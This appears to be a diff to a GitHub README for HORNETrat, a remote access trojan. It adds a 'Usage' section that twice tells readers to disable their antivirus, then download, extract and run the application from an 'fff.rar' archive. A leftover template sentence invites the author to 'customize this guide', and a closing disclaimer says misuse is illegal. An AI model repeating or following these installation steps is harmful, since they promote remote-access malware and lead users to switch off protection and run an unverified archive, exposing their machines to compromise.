@@ -19,5 +19,24 @@ HORNETrat, also known as 'HORNET Worm,' is a sophisticated .NET-based remote acc
 
 - And more, more and more...
 
+## Usage
+
+### System Requirements:
+
+ • Operating System: Windows only.
+ • Disable your antivirus software for the proper functioning of the program.
+
+### Installation Instructions:
+
+ 1. Download the program from the GitHub repository.
+ 2. Locate and download the “fff.rar” file.
+ 3. Extract the application from the “fff.rar” file.
+ 4. Place the extracted application on your desktop.
+
+## Note: • Ensure that your antivirus software is disabled while using the program for seamless operation.
+
+For any further assistance or inquiries, please refer to the GitHub repository’s documentation or contact the developer.
+Feel free to customize this guide with specific details about your program and any additional information you’d like to provide.
+
 # Please be aware that HORNETrat and similar malware pose a significant threat to cybersecurity, and any attempt to deploy or use such software for malicious purposes is against the law.
 
